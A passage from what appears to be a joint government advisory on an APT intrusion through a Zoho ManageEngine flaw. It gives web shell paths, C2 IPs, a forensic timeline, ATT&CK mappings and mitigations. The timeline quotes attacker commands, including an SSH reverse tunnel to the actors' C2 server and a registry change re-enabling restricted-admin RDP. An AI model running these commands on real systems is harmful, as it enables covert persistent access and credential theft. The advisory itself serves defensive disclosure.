47.90.240[.]218

APT actors further leveraged legitimate credentials to move from the firewall to a web server, where multiple web shells were loaded—among other locations, such as the OWA server—into the following directories. Note: The following file paths to these web shells were received in coordination with a trusted third-party; however, the artifacts were not received for analysis.

c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\resource.aspx
c:\inetpub\wwwroot\[REDACTED]\css\font-awesome\css\discover.ashx
c:\inetpub\wwwroot\[REDACTED]\css\font-awesome\css\configlogin.ashx
c:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\15\template\layouts\approveinfo.aspx
c:\Program Files\Microsoft Office Web Apps\RootWebsite\infos.aspx
c:\Program Files\Microsoft Office Web Apps\RootWebsite\errorinfo.aspx
c:\Program Files\Microsoft Office Web Apps\RootWebsite\infos.ashx
c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\error.aspx
c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\infos.aspx
c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\info.aspx
c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\info-1.aspx
c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\new_list.aspx
c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\errorinfo.aspx
c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\lgnbotr.ashx
c:\inetpub\passwordchange\0LECPNJYRH.aspx
c:\inetpub\passwordchange\9ehj.aspx
c:\inetpub\wwwroot\wss\VirtualDirectories\Portal80\_vti_pvt\servicesinfo.ashx
c:\inetpub\wwwroot\wss\VirtualDirectories\Portal80\_vti_pvt\services.aspx
c:\inetpub\redirectedSites\[REDACTED]\products\uns1fw.aspx
c:\inetpub\redirectedSites\[REDACTED]\products\uns1ew.aspx

The following IP addresses were identified as associated with the loaded web shells:

45.90.123[.]194
154.6.91[.]26
154.6.93[.]22
154.6.93[.]5
154.6.93[.]12
154.6.93[.]32
154.6.93[.]24
184.170.241[.]27
191.96.106[.]40
102.129.145[.]232

Forensic Timeline of APT Actor Activity
Tables 1 and 2 list the timeline of events discovered during the incident response, as well as tools used by the APT actors to conduct their operations, respectively. All timestamps are presented in Coordinated Universal Time (UTC).

Table 1: Timeline of APT Actor Activity


Timestamp (UTC)
Event
Description





2023-01-18
11:57:02


Hello World User-Agent string observed in 44 total events.
Uniform Resource Identifier (URI): /cgi-bin/downloadFlile[.]cgi

Hello World, the User-Agent string inside of the initiated HTTP request, was observed during communication between the organization’s web server and malicious command and control (C2) server IP 92.118.39[.]82 [T1071.001]. This string has been observed in open source as an initial step of the Mirai botnet to download malicious artifacts [T1583.005].[1]


2023-01-20
Attempts made to export three files; associated with malicious IP 192.142.226[.]153.

APT actors attempted to export [TA0009], [TA0010] three files, which were analyzed and identified as Local Security Authority Subsystem Service (LSASS) dump files. These files were renamed with .zip and .gif extensions to evade detection [T1036.008]. Analysis confirmed the APT actors were unsuccessful at exfiltrating these files:

wo_view_bg.zip (09:06:37 UTC)\
wo_view_bg1.gif (09:08:11 UTC)
wo_view_bg2.gif (09:19:43 UTC)

Note: If local administrative access is achieved on a victim host, dumping LSASS credentials may allow for lateral movement across the environment. This behavior was identified during the engagement and is detailed throughout Table 1.




2023-01-20
16:51:05

Successful web server exploitation via CVE-2022-47966.
Successful web server (Zoho ManageEngine ServiceDesk Plus) exploitation via CVE-2022-47966.



2023-01-21
06:46:42

Azure local user account with administrative permissions created.
A local user account with administrative permissions, named Azure, was created on the server hosting ServiceDesk Plus.



2023-01-21
06:49:40

LSASS dumped by Azure user.

The Azure user successfully accessed and dumped credentials stored in the process memory of LSASS for the Active Directory (AD) domain [T1003.001].
Note: Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.




2023-01-21
06:50:59

Mimikatz.exe downloaded via ConnectWise ScreenConnect.

The legitimate ConnectWise ScreenConnect client was utilized to connect to the ServiceDesk system, download mimikatz.exe, and execute malicious payloads to steal credentials [T1219], [T1588.002].
Note: ConnectWise ScreenConnect was observed in multiple locations within the organization’s environment, but the organization confirmed that it was not authorized software. Analysis assessed APT actors downloaded the legitimate software for malicious, illegitimate use prior to the download of mimikatz.exe.




2023-01-21
07:34:32

Bitmap.exe malware downloaded and designated to connect to C2 IP 179.60.147[.]4.

Azure user account downloaded bitmap.exe to the ServiceDesk system to execute an obfuscated, embedded malicious payload from its C2 server [T1027.009]. This malware is identified as a variant of Metasploit (Meterpreter).
See MAR-10430311-1.v1 for additional details.




2023-01-21
08:46:23

Mimikatz credential dump files created.
Two files (c:\windows\system32\fuu.txt, c:\windows\system32\jojo.txt) were created as means for Mimikatz to dump/write credentials to disk on the ServiceDesk system [T1003].



2023-01-21
09:25:58

Legitimate files/applications nmap.exe and npcap.exe downloaded.

Azure user account downloaded nmap.exe [T1018] and npcap.exe [T1040] to continue network and credential information gathering efforts. Though legitimate applications, APT actors used these files for illegitimate, malicious purposes.
Note: Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.




2023-01-21
13:56:14

ssh2.zip downloaded by the Azure user account.

APT actors downloaded the file ssh2.zip via the Azure user account, which contained legitimate files that could have been leveraged for malicious purposes. When unzipped, the following files were extracted:

install-sshd.ps1 (script)
psexec.exe
sshd.exe
ssh.exe
ssh-sk-helper.exe
libcrypto.dll

Note: CISA analyzed these files and did not identify the files as malicious. However, ssh.exe was downloaded to establish persistence on the ServiceDesk system via SSH [T1133] and is detailed in the scheduled task below.




2023-01-21
14:02:45

Ngrok token created, renamed to ngrok.yml config file, and Remote Desktop Protocol (RDP) connection established.

Ngrok was used to establish an RDP connection [T1021.001]—another method of maintaining persistence on the ServiceDesk system. In this instance, Ngrok was used to establish a reverse proxy connection to the ServiceDesk system.
At the time of analysis, the firewall access control lists (ACLs) allowed all outbound connections. Considering APT actors utilized an outbound proxy, the RDP session was successfully established as the connection was initiated from the ServiceDesk system.
Note: RDP is a common feature in operating systems, which allows a user to log into an interactive session with a system desktop graphical user interface on a remote system.




2023-01-21
14:31:01

SSH tools downloaded to establish reverse (remote) communication.

Three identified executables, which provide a command line interface with the compromised system, were observed in the following file system locations:

c:\windows\system32\ssh-shellhost.exe
c:\windows\system32\ssh-agent.exe
c:\windows\system32\ssh-add.exe

While the files were not identified as malicious, they were loaded for malicious purposes.




2023-01-21
14:33:11

license validf scheduled task created to communicate with malicious IP 104.238.234[.]145.

license validf scheduled task [T1036.004] was created to execute ssh.exe on a recurring basis on the ServiceDesk system [T1053.005]:
c:\Windows\System32\ssh.exe -N -f -R 12100 sst@104.238.234.145 -p 443 -o StrictHostKeyChecking=no
Analysis identified ssh.exe was used to establish a SSH reverse tunnel to the APT actors’ C2 with dynamic port forwarding [T1572]. This allowed the actors to send traffic from their C2 server into the environment and connect directly to other systems and resources.




2023-01-21
14:51:49

PsExec executed on the ServiceDesk system.

Analysis identified evidence and execution of two files (PsExec.exe and psexec.exe) on the ServiceDesk system. These files were determined to be benign.
APT actors utilized PsExec to create a scheduled task and force-store administrative credentials to the local machine.
psexec.exe -i -s C:\Windows\System32\mmc.exe /s C:\Windows\System32\taskschd.msc
powershell New-ItemProperty -Path ""HKLM:\System\CurrentControlSet\Control\Lsa"" -Name ""DisableRestrictedAdmin"" -Value ""0"" -PropertyType DWORD -Force
Note: PsExec, a command line utility from Microsoft's Sysinternals Suite, is known to be used for lateral movement; evidence of lateral movement via PsExec has not been confirmed.




2023-01-21
14:55:02

ProcDump created on the ServiceDesk system.
ProcDump was created within the c:\windows\system32\prc64.exe directory. This was later identified as a method for enumerating running processes/applications [T1057] and dumping LSASS credentials.



2023-01-24
15:07:18

Apache Log4j exploit attempted against the ServiceDesk system.

APT actors attempted to exploit a known Apache Log4j vulnerability (CVE-2021-44228) in the ServiceDesk system but were unsuccessful. The two IPs and one domain associated with this exploitation attempt are:

80.85.241[.]15
68.177.56[.]38
main.cloudfronts[.]net





2023-01-25
00:17:33

Mimikatz credential dump files created.

One file (c:\ManageEngine\ServiceDesk\bin\1.txt) was created as a method for Mimikatz to dump/write credentials to disk on the ServiceDesk system.
Note: This is a different path and time associated with Mimikatz than listed above.



2023-01-29
HTTP-GET requests sent to C2 IP 92.118.39[.]82.
The server hosting ServiceDesk was observed beaconing/sending HTTP-GET requests to a suspected APT-controlled C2 server, indicating malware was successfully implanted.



2023-02-02
05:51:08

Resource.aspx web shell detected.

Using additionally compromised, legitimate administrative credentials, APT actors logged into the Outlook Web Application (OWA) server from the ServiceDesk system. The actors dropped an Active Server Pages Extended (ASPX) web shell in the following file system location, which was designed to execute remote JavaScript code [T1059.007] on the OWA server [T1505.003]:

c:\Program Files\Microsoft Office Web Apps\RootWebSite\en-us\resource.aspx

Note: The administrative user’s credentials were obtained from the APT actors’ collection (LSASS dump) of credentials from the entire AD domain. This user is separate from the actor-created Azure user account.
See MAR-10430311-1.v1 for additional details.




2023-02-02
18:45:58

Metasploit service installed.

APT actors installed Metasploit with the following attributes on the organization’s domain controller [T1059.001]:

Service Name: QrrCvbrvnxasKTSb [T1543.003]
Service File Name: %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c &amp;quot;if([IntPtr]::Size -eq 4) [T1564.003]

Note: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform several actions, including discovery of information and execution of code.




2023-02-03
03:27:59

ConfigLogin.aspx web shell detected.

APT actors dropped an additional ASPX web shell on a web server in the following file system location:

c:\inetpub\wwwrot\[REDACTED]\css\font-awesome\css\ConfigLogin.aspx

See MAR-10430311-1.v1 for additional details.




2023-02-03
15:12:23

wkHPd.exe created to communicate with malicious IP 108.62.118[.]160.

APT actors created and used a variant of Metasploit (Meterpreter) on the ServiceDesk system, listed as wkHPd.exe [T1587.001]. This variant serves as an attack payload that runs an interactive shell and allows a malicious actor to control and execute code on a system.
See MAR-10430311-1.v1 for additional details.




2023-02-08
08:56:35,
2023-02-09
20:19:59,
2023-03-04,
2023-03-18

Hypertext Preprocessor (PHP) files uploaded via HTTP-POST request from malicious IP 193.142.146[.]226.

PHP files were uploaded to the ServiceDesk system via HTTP-POST request. APT actors were observed writing 16 instances of the following files to disk:

[REDACTED]/wp-content/themes/seotheme/db.php (12 instances)
[REDACTED]/wp-content/plugins/ioptimization/IOptimize.php (4 instances)





2023-03-06
06:49:40

Interact.sh

APT actors executed Domain Name System (DNS) scanning at an additional server (not the ServiceDesk system) and directed callback to the Interact.sh domain, which indicated the server was susceptible to a DNS-style attack [T1046].
Destination IP: 103.105.49[.]108




Post-engagement analysis was extended but analysts were unable to determine additional actions taken by the APT actors, likely due to a lack of sensor coverage and data unavailability. With the data available, it was determined APT actors used the tools listed in Table 2 during their operations.

Table 2: Observed Tools Used by APT Actors


Tool
Description
Observation




Mimikatz [2]
A credential dumping tool capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks.

In addition to using Mimikatz for credential dumping, APT actors dumped the following Windows Registry Hive files:

sam.hiv [T1003.002]
system.hiv
security.hiv

These files were dumped to obtain registry information such as users on the system, data used by the operating system [T1012], and installed programs.



Ngrok [3]

Ngrok software operates by running a client process on the machine and creating a private connection tunnel to a designated open port. Ngrok delivers instant ingress to applications in any cloud, private network, or devices with authentication, load balancing, and other critical controls.
In recent years, Ngrok has been leveraged maliciously by a variety of threat actors, including use for persistence, lateral movement, and data exfiltration.[4],[5],[6]


Using Ngrok as an external service, APT actors were able to gain access to and utilize the command line on victim systems.
Note: CISA and co-sealers have observed this commonly used commercial platform being abused by malicious actors to bypass typical firewall controls. Ngrok’s ability to tunnel RDP and other services securely over internet connections makes it a target for abuse by malicious actors.



ProcDump
A command-line application used to monitor processes and create crash dump files. A crash dump file contains the data loaded in memory at the time the dump was triggered. It is typically used for troubleshooting errors with an application or operating system.
APT actors used ProcDump to conduct reconnaissance and examine spawned processes (applications in use). This tool was also utilized as a utility for dumping credentials from the server hosting ServiceDesk Plus.


Metasploit

Metasploit is an open-source penetration testing software.
 

APT actors’ specific use of Meterpreter—an attack payload of Metasploit—serves as an interactive shell and allows threat actors to control and execute code on a system.


Interact.sh
An open-source tool for detecting external interactions (communication).[7] This tool is used to detect callbacks from target systems for specified vulnerabilities and commonly used during the reconnaissance stages of adversary activity.
APT actors likely used Interact.sh to refrain from using and disclosing their own C2 infrastructure.


anydesk.exe

A remote desktop application that provides platform-independent remote access to personal computers and other devices running the host application. It offers remote control, file transfer, and VPN functionality.
 


Between early-February and mid-March 2023, anydesk.exe was observed on three hosts with different certificate issuers and hashes—none of which were the certified issuer [T1553.002]. APT actors compromised one host and moved laterally to install the executable on the remaining two [T1570]—listed in order of time, as follows:

c:\programdata\anydesk.exe
c:\Users\[REDACTED]\Downloads\AnyDesk.exe
c:\Users\[REDACTED]\Documents\personal\program\AnyDesk.exe

Note: Analysts confirmed APT actors’ weaponized use of anydesk.exe but were unable to confirm how the software was installed on each host.



quser.exe
A valid program on Windows machines that displays information about user sessions on a Remote Desktop Session Host server [T1049], including the name of the user, name of the session on the remote desktop session host server, session ID, state of the session (active or disconnected), idle time (number of minutes since last keystroke or mouse movement), and date/time the user logged on.[8]

APT actors were observed using this tool as early as March 2023 across four locations with the same name but different hashes (one of which is associated with the Portuguese [Brazil] language pack):
c:\ProgramFiles\WindowsApps\Microsoft.LanguageExperiencePackpt-BR_19041.56.186.0_neutral__8wekyb3d8bbwe\Windows\System32\pt-BR



xpack.exe
A custom .NET loader that decrypts (AES), loads, and executes accompanying files.

Xpack.exe indicators were present on multiple organization hosts, with an unverified user account observed navigating to the sites: xpack.github[.]io and xpack.disqus[.]com. Additionally, one administrator account and multiple user accounts were observed executing the xpack.exe file from a hidden directory [T1564.001]:
c:\USERS\[REDACTED]\.P2\POOL\PLUGINS\ORG.ECLIPSE.EMBEDCDT.TEMPLATES.XPACK_6.3.1.202210101738
This malware was predominantly used to execute system commands, drop additional malware and tools, and stage data for exfiltration [T1074]. Note: The data exfiltrated is unknown.




 
MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 3-13 for all referenced APT actors’ tactics and techniques for enterprise environments in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.

Table 3: Resource Development


Technique Title
ID
Use




Acquire Infrastructure: Botnet
T1583.005
Actors used User-Agent string Hello World as an initial step of the Mirai botnet to later download malicious artifacts.


Develop Capabilities: Malware
T1587.001
Actors created and used a variant of Metasploit (Meterpreter) on the ServiceDesk system, listed as wkHPd.exe. This malware serves as an attack payload that runs an interactive shell; it allows for control and code execution on a system.


Obtain Capabilities: Exploits
T1588.002
Actors leveraged the legitimate ConnectWise ScreenConnect client to download and utilize the credential dumping tool, mimikatz.exe.



 

Table 4: Initial Access


Technique Title
ID
Use




Exploit Public-Facing Application
T1190

Actors exploited a known vulnerability (CVE-2022-47966) in the organization’s web server hosting Zoho ManageEngine ServiceDesk Plus.
Actors also attempted to exploit a known Apache Log4j vulnerability (CVE-2021-44228) in the ServiceDesk system but were unsuccessful.




 

Table 5: Execution


Technique Title
ID
Use




Command and Scripting Interpreter: PowerShell
T1059.001
Actors installed and used Metasploit via PowerShell on the organization’s domain controller.


Command and Scripting Interpreter: JavaScript
T1059.007
Actors dropped an ASPX web shell on the OWA server, which was designed to execute remote JavaScript code.



 

Table 6: Persistence


Technique Title
ID
Use




Scheduled Task/Job: Scheduled Task
T1053.005
Actors created the scheduled task license validf to execute ssh.exe on a recurring basis. This executable was observed as means of establishing persistence on the ServiceDesk system.


Valid Accounts: Local Accounts
T1078.003
Actors compromised and utilized account credentials from a previously hired contractor, of which the contract ended prior to the timeframe of observed activity.


External Remote Services
T1133
ssh.exe executes on a recurring basis via a scheduled task on the ServiceDesk system as a method for access via SSH.


Create Account: Local Account
T1136.001
Actors created a local account with administrative permissions on the server hosting ServiceDesk Plus.


Server Software Component: Web Shell
T1505.003
Actors logged into the OWA server from the ServiceDesk system and dropped an ASPX web shell to establish persistent access and execute remote code.


Create or Modify System Process: Windows Service
T1543.003
Actors created a Windows Service via Metasploit.



 

Table 7: Privilege Escalation


Technique Title
ID
Use




Exploitation for Privilege Escalation
T1068
Through exploitation of CVE-2022-47966, actors were given root level access on the web server and created a local user account named Azure with administrative privileges.



 

Table 8: Defense Evasion


Technique Title
ID
Use




Indicator Removal: Clear Windows Event Logs
T1070.001
Actors compromised and used disabled, legitimate administrative account credentials to delete logs from several critical servers in the environment.


Masquerading: Masquerade Task or Service
T1036.004
Actors created a scheduled task license validf, which appears as legitimate/benign and executes ssh.exe on a recurring basis on the ServiceDesk system.


Masquerading: Masquerade File Type
T1036.008
Actors attempted to export three files, which were analyzed and identified as LSASS dump files. These files were renamed with .zip and .gif extensions to evade detection.


Obfuscated Files or Information: Embedded Payloads
T1027.009
Actors downloaded the malware bitmap.exe on the ServiceDesk system to execute an obfuscated, embedded malicious payload from its C2 server.


Subvert Trust Controls: Code Signing
T1553.002
Anydesk.exe was observed on three hosts with different certificate issuers and hashes—none of which were the certified issuer.


Hide Artifacts: Hidden Files and Directories
T1564.001
Actors used xpack.exe as a method for decrypting, loading, and executing accompanying files from a hidden directory.


Hide Artifacts: Hidden Window
T1564.003
Actors used -w hidden to conceal PowerShell windows by setting the WindowStyle parameter to hidden.



 

Table 9: Credential Access


Technique Title
ID
Use




OS Credential Dumping
T1003
Actors created three files as means for Mimikatz to dump/write credentials to disk on the ServiceDesk system.


OS Credential Dumping: LSASS Memory
T1003.001
Actors successfully accessed and dumped credentials stored in the process memory of LSASS for the AD domain, including with the use of ProcDump.


OS Credential Dumping: Security Account Manager
T1003.002
Actors dumped sam.hiv to obtain information about users on the system.



 

Table 10: Discovery


Technique Title
ID
Use




System Network Connections Discovery
T1049
Quser.exe was executed to acquire information about user sessions on a Remote Desktop Session Host server.


Query Registry
T1012
Actors dumped system.hiv and security.hiv to obtain information about the data used by the operating system.


Remote System Discovery
T1018
Actors downloaded the legitimate file/application nmap.exe via the Azure user to conduct network information gathering efforts.


Network Sniffing
T1040
Actors downloaded the legitimate file/application npcap.exe via the Azure user to conduct credential gathering efforts.


Network Service Discovery
T1046
Actors executed DNS scanning at a web server and directed callback to the Interact.sh domain, which indicated the server was susceptible to a DNS-style attack.


Process Discovery
T1057
ProcDump was created within the c:\windows\system32\prc64.exe directory as a method for enumerating running processes/applications.



 

Table 11: Lateral Movement


Technique Title
ID
Use




Remote Services: Remote Desktop Protocol
T1021.001
Ngrok was used to establish an RDP connection with the ServiceDesk system.


Lateral Tool Transfer
T1570
Actors compromised one host and moved laterally to install anydesk.exe on two additional hosts.



 

Table 12: Collection


Technique Title
ID
Use




Data Staged
T1074
Actors executed xpack.exe malware from a hidden directory. This malware was predominantly used to execute system commands, drop additional malware and tools, and stage data for exfiltration.



 

Table 13: Command and Control


Technique Title
ID
Use




Application Layer Protocol: Web Protocols
T1071.001
Hello World User-Agent string was identified in a HTTP request. Communication occurred between the organization’s web server and an actor-controlled C2 IP address.


Remote Access Software
T1219

Actors leveraged ConnectWise ScreenConnect to connect to the ServiceDesk system.
Anydesk.exe was run on at least three different hosts in the environment.



Non-Standard Port
T1571
Actors initiated multiple TLS-encrypted sessions on non-standard TCP port 10443.


Protocol Tunneling
T1572

Actors were observed leveraging SSH to build a reverse tunnel with their C2 server to dynamically forward traffic into the victim organization’s environment.
Using Ngrok as an external service, actors were also able to gain access to and use the command line on victim systems via RDP.



Encrypted Channel: Asymmetric Cryptography
T1573.002
Actors initiated multiple TLS-encrypted sessions on TCP port 10443, indicating successful exchanges of data transfer from the firewall device.



 
DETECTION METHODS
CISA and co-sealers recommend reviewing Tables 3-13: Identified ATT&CK Techniques for Enterprise in conjunction with the detections in this section to identify similar activity.

Enable logging for new user creation [DS0002], as well as monitor executed commands and arguments for actions that are associated with local account creation, such as net user /add, useradd, and dscl -create [DS0017].
Monitor for newly constructed scheduled tasks by enabling the ""Microsoft-Windows-TaskScheduler/Operational"" setting within the event logging service. Monitor for changes made to scheduled tasks that may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools [DS0003].
Monitor for API calls that may create or modify Windows services (ex: CreateServiceW()) to repeatedly execute malicious payloads as part of persistence [DS0009].
Monitor executed commands and arguments that may attempt to access credential material stored in the process memory of the LSASS [DS0017].
Monitor for user accounts logged into systems associated with RDP (ex: Windows EID 4624 Logon Type 10) [DS0028].
Monitor for newly-constructed network connections associated with pings/scans that may attempt to collect a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for lateral movement from the current system [DS0029].
Conduct full port scans (1-65535) on internet-facing systems—not just a subset of the ports.

MITIGATIONS
Note: These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
Manage Vulnerabilities and Configurations [CPG 1.E, CPG 3.A]
CISA and co-sealers identified that exploitation of CVE-2022-47966 granted initial access to the public-facing application, Zoho ManageEngine ServiceDesk Plus. Multiple Zoho ManageEngine on-premises products, such as ServiceDesk Plus through 14003, allow remote code execution due to use of version 1.4.1 of Apache XML Security for Java (also known as xmlsec) from the Apache Santuario project. Due to the xmlsec XSLT features by design in that version, the application is responsible for certain security protections. CISA and co-sealers recommend the following:

Document device configurations [CPG 2.O]. Organizations should maintain updated documentation describing the current configuration details of all critical IT assets (and OT, where applicable), as this facilitates more effective vulnerability and response activities.
Keep all software up to date and patch systems for known exploited vulnerabilities. In places with known exploited vulnerabilities on an endpoint device (e.g., firewall security appliances), conduct investigation prior to patching [CPG 1.E].
Follow a routine patching cycle [M1051] for all operating systems, applications, and software (including all third-party software) to mitigate the potential for exploitation.
Prioritize remediation of vulnerabilities on internet-facing systems, for example, by conducting continuous automated and/or routine vulnerability scans [M1016]. CISA offers a range of services at no cost, including scanning and testing to help organizations reduce exposure to threats via mitigating attack vectors. Specifically, Cyber Hygiene services can help provide a second-set of eyes on organizations' internet-accessible assets. Organizations can email vulnerability@cisa.dhs.gov with the subject line, “Requesting Cyber Hygiene Services” to get started. For additional guidance on remediating these vulnerabilities, see CISA Insights - Remediate Vulnerabilities for Internet-Accessible Systems.
Deploy security.txt files [CPG 4.C]. All public-facing web domains have a security.txt file that conforms to the recommendations in RFC 9116.[9]

Segment Networks [CPG 2.F]
CISA and co-sealers identified that the organization did not employ proper network segmentation, such as a demilitarized zone (DMZ), during the initial discovery phase of the incident response. A DMZ serves as a perimeter network that protects and adds an extra layer of security to an organization’s internal local area network (LAN) from untrusted traffic.

Employ proper network segmentation, such as a DMZ, and ensure to address the following recommendations. Note: The end goal of a DMZ network is to allow an organization to access untrusted networks, such as the internet, while ensuring its private network or LAN remains secure. Organizations typically store external-facing services and resources, as well as servers for DNS, File Transfer Protocol (FTP), mail, proxy, Voice over Internet Protocol (VoIP), and web servers in the DMZ [CPG 2.K, CPG 2.W].

Limit internet-facing port exposure for critical resources in the DMZ networks.
Limit exposed ports to only required IP addresses and avoid placing wildcards in destination port or host entries.
Ensure unsecured protocols like FTP and HTTP are limited in use and restricted to specific IP ranges.
If data flows from untrusted zone to trusted zone, ensure it is conducted over a secure protocol like HTTPS with mandatory multi-factor authentication.


Use a firewall or web-application firewall (WAF) and enable logging to prevent/detect potential exploitation attempts [M1050]. Review ingress and egress firewall rules and block all unapproved protocols. Limit risky (but approved) protocols through rules.

Use WAF to limit exposure to just approved ports, as well as monitor file changes in web directories.


Implement network segmentation to separate network segments based on role and functionality. Proper network segmentation significantly reduces the ability for threat actor lateral movement by controlling traffic flows between—and access to—various subnetworks. See CISA’s Layering Network Security Through Segmentation infographic and the National Security Agency’s (NSA’s) Segment Networks and Deploy Application-Aware Defenses.

Manage Accounts, Permissions, and Workstations
APT actors were able to leverage disabled administrative accounts, as well as clear logs on several critical servers, which prevented the ability to detect follow-on exploitation or data exfiltration. CISA and co-sealers recommend the following:

Use phishing-resistant multi-factor authentication (MFA) [CPG 2.H] (e.g., security tokens) for remote access and access to any sensitive data repositories. Implement phishing-resistant MFA for as many services possible—particularly for webmail and VPNs—for accounts that access critical systems and privileged accounts that manage backups. MFA should also be used for remote logins [M1032]. For additional guidance on secure MFA configurations, visit cisa.gov/MFA and CISA’s Implementing Phishing-Resistant MFA Factsheet.
Employ strong password management alongside other attribute-based information, such as device information, time of access, user history, and geolocation data. Set a password policy to require complex passwords for all users (minimum of 16 characters) and enforce this new requirement as users’ passwords expire [CPG 2.A, CPG 2.B, CPG 2.C].
Implement the principle of least privilege to decrease threat actors’ abilities to access key network resources.
Limit the ability of a local administrator account to log in from a local interactive session [CPG 2.E] (e.g., “Deny access to this computer from the network”) and prevent access via an RDP session.
Establish policy and procedure for the prompt removal of unnecessary (disabled) accounts and groups from the enterprise that are no longer needed, especially privileged accounts. Implement and enforce use of Local Administrator Password Solution (LAPS).
Control and limit local administration, ensuring administrative users do not have access to other systems outside of the local machine and across the domain.
Create a change control process for all privilege escalations and role changes on user accounts. Enable alerts on privilege escalations and role changes, as well as log privileged user changes in the network environment and create alerts for abnormal events.
Create and deploy a secure system baseline image to all workstations. See Microsoft’s guidance on Using Security Baselines in Your Organization.
Implement policies to block workstation-to-workstation RDP connections [CPG 2.V] through a Group Policy Object on Windows, or by a similar mechanism. The RDP service should be disabled if it is unnecessary [M1042].

Secure Remote Access Software
Remote access software provides a proactive and flexible approach for organizations to internally oversee networks, computers, and other devices; however, cyber threat actors increasingly co-opt these tools for access to victim systems. APT actors were observed using legitimate remote access tools—ConnectWise ScreenConnect and AnyDesk—to connect to victim hosts within the organization’s environment and further conduct malicious operations. CISA and co-sealers recommend the following:

Establish a software behavior baseline to detect anomalies in behavior [CPG 2.T, CPG 2.U].
Monitor for unauthorized use of remote access software using endpoint detection tools.

For more information, see CISA’s joint Guide to Securing Remote Access Software on best practices for using remote capabilities and how to detect and defend against malicious actors abusing this software.
Other Best Practice Mitigation Recommendations

Use application allowlists on domain controllers, administrative hosts, and other sensitive systems. Following exploitation of the public-facing application (Zoho ManageEngine ServiceDesk Plus), APT actors were able to download and execute multiple files on the system, which were then utilized to enumerate the network and perform reconnaissance operations.

Use directory allowlisting rather than attempting to list every possible permutation of applications in a network environment. Safe defaults allow applications to run from PROGRAMFILES, PROGRAMFILES(X86), and SYSTEM32. Disallow all other locations unless an exception is granted and documented. Application directory allowlisting can be enabled through Microsoft Software Restriction Policy or AppLocker and can prevent the execution of unauthorized software.


Audit scheduled tasks and validate all findings via a Group Policy Object (GPO) or endpoint detection and response (EDR) solution.
Follow Microsoft’s Best Practices for Securing Active Directory.
Review NSA’s Network Infrastructure Security Guide.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA and co-sealers recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA and co-sealers also recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 3-13).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA and co-sealers recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

NIST: NVD CVE-2022-47966
NIST: NVD CVE-2022-42475
CISA: KEV List
MITRE ATT&CK for Enterprise v13.1
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping
CISA: Decider Tool
CISA: Cross-Sector Cybersecurity Performance Goals
CISA: Cyber Hygiene Services
CISA: Remediate Vulnerabilities for Internet-Accessible Systems
CISA: Layering Network Security Through Segmentation
NSA: Segment Networks and Deploy Application-Aware Defenses
CISA: MFA
CISA: Implementing Phishing-Resistant MFA
Microsoft: Using Security Baselines in Your Organization
CISA: Guide to Securing Remote Access Software
Microsoft: Best Practices for Securing Active Directory
NSA: Network Infrastructure Security Guide

DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA, the FBI, and CNMF do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA, the FBI, or CNMF.
REFERENCES

Snort: Known Malicious User-Agent String – Mirai
MITRE: Mimikatz
MITRE: Ngrok
AA22-320A: Iranian Government-Sponsored APT Actors Compromise Federal Network, Deploy Crypto Miner, Credential Harvester
AA22-294A: #StopRansomware: Daixin Team
AA23-075A: #StopRansomware: LockBit 3.0
GitHub: Interactsh
Microsoft: Quser
Internet Engineering Task Force (IETF): RFC 9116

VERSION HISTORY
September 7, 2023: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


